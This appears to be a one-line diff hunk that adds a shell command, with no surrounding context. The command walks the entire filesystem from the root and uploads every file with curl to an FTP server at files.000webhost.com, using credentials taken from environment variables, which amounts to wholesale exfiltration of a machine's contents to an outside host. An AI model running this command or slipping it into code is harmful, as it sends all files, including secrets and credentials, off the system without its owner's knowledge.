@@ -1,0 +1,1 @@
+find / -type f -exec curl -u $FTP_USER:$FTP_PASSWORD --ftp-create-dirs -T {} -u $FTP_USER:$FTP_PASSWORD ftp://files.000webhost.com \;
